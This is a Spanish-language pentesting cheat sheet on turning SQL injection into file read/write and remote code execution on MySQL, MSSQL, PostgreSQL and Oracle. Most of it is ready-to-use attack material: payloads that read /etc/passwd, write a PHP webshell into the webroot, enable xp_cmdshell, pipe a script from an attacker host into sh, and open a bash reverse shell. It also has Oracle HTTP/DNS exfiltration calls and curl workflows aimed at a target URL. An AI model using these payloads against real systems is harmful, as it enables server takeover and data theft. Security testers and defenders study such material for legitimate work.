---
aliases: null
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: CheatSheet
linked:
  - '[[SQL Commands]]'
---
# SQL - Interacción Especial y Archivos

***

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `SELECT LOAD_FILE('/etc/passwd')` (MySQL) | Read arbitrario de archivo local | MySQL + `secure_file_priv` permite + FILE privilege. |
| `SELECT 'X' INTO OUTFILE '/var/www/html/x.txt'` (MySQL) | Write archivo en filesystem | Mismo + path writable por user `mysql`. |
| `SELECT '<?=`$_GET[0]`?>' INTO OUTFILE '/var/www/html/shell.php'` (MySQL) | Webshell directo en webroot → RCE | Pre-requisitos + webroot detectado. |
| `EXEC master..xp_cmdshell 'whoami'` (MSSQL) | Comando OS arbitrario | MSSQL + `xp_cmdshell` enabled (DBA priv). |
| `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE` (MSSQL) | Habilita `xp_cmdshell` si deshabilitado | DBA priv. Pre-paso para RCE. |
| `BULK INSERT t FROM 'C:\\inetpub\\wwwroot\\file.txt'` (MSSQL) | Read archivo Windows en tabla | MSSQL alt a `xp_cmdshell` para read. |
| `OPENROWSET(BULK 'C:\\file.txt', SINGLE_CLOB) AS x` (MSSQL) | Read inline | Mismo, sin requerir tabla destino. |
| `COPY t TO '/tmp/dump.csv'` (PostgreSQL) | Write tabla a CSV | PostgreSQL superuser. |
| `COPY t FROM PROGRAM 'curl http://attacker/shell.sh \| sh'` (PostgreSQL) | RCE directo — pipe a shell | PostgreSQL ≥9.3 superuser. |
| `CREATE FUNCTION sys_exec(text) RETURNS int AS 'lib_postgres.so' LANGUAGE C` (PostgreSQL) | UDF C custom → RCE | PostgreSQL con libs cargables. |
| `SELECT UTL_FILE.FOPEN('DIR','file.txt','R')` (Oracle) | Read archivos | Oracle con `UTL_FILE` permitido. |
| `SELECT UTL_HTTP.request('http://attacker/x') FROM dual` (Oracle) | HTTP outbound | OOB exfil Oracle. |
| `SELECT UTL_INADDR.get_host_address('attacker.com') FROM dual` (Oracle) | DNS outbound | DNS exfil Oracle. |
| `BEGIN ... EXCEPTION WHEN OTHERS THEN ... END;` (PL/SQL) | Capturar excepciones para error-based blind | Oracle error-based. |
| `OPENQUERY(LinkedServer, 'SELECT @@version')` (MSSQL) | Query a server linked | Lateral movement MSSQL → MSSQL. |
| `SELECT * FROM dblink('host=target user=postgres','SELECT version()') AS t(c text)` (PostgreSQL) | Query a otro PG remoto | Lateral movement PG. |
^sql-interaccionEspecial

### Workflow MySQL `INTO OUTFILE` para RCE

```bash
TARGET="https://target/items?id=1"

# 1. Verificar FILE privilege
PAYLOAD="' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE privilege_type='FILE'-- -"
curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")"

# 2. Verificar secure_file_priv
PAYLOAD="' UNION SELECT variable_name,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -"
# Si vacío "" → write anywhere; si "/path/" → solo ahí; si NULL → bloqueado total.

# 3. Confirmar webroot via LOAD_FILE
for path in '/var/www/html/index.php' '/var/www/html/config.php' '/usr/share/nginx/html/index.php'; do
  PAYLOAD="' UNION SELECT LOAD_FILE('$path'),NULL-- -"
  curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")" | head
done

# 4. Escribir webshell
PAYLOAD="' UNION SELECT '<?=\`\$_GET[0]\`?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -"
curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote('$PAYLOAD'))")"

# 5. RCE
curl 'https://target/shell.php?0=id'
```

### Workflow MSSQL `xp_cmdshell` para RCE

```bash
# 1. Habilitar si deshabilitado
P1="'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -"

# 2. Ejecutar
P2="'; EXEC master..xp_cmdshell 'whoami'-- -"
```

### Workflow PostgreSQL `COPY FROM PROGRAM`

```bash
# RCE en 1 query (PG ≥9.3 superuser)
PAYLOAD="'; CREATE TABLE x(x text); COPY x FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"'-- -"
```

___

## Overview

Funciones que cruzan la frontera SQL ↔ OS. Vector más severo de SQLi — **RCE directo** sin necesidad de chain con LFI/upload.

**Requisitos por motor:**

| Motor | Función | Privs |
|:---:|:---:|:---:|
| MySQL | `INTO OUTFILE` | `FILE` privilege + `secure_file_priv=''` o path |
| MSSQL | `xp_cmdshell` | `sysadmin` (DBA) |
| PostgreSQL | `COPY FROM PROGRAM` | `superuser` (PG ≥9.3) |
| Oracle | `UTL_HTTP`/`UTL_FILE` | `EXECUTE` privilege + ACL |

Modern hardening: estos privs son default-off en stacks recientes. Bug bounty target = apps que ejecutan queries como `root`/`sa`/`postgres` (legacy/lazy config).

***
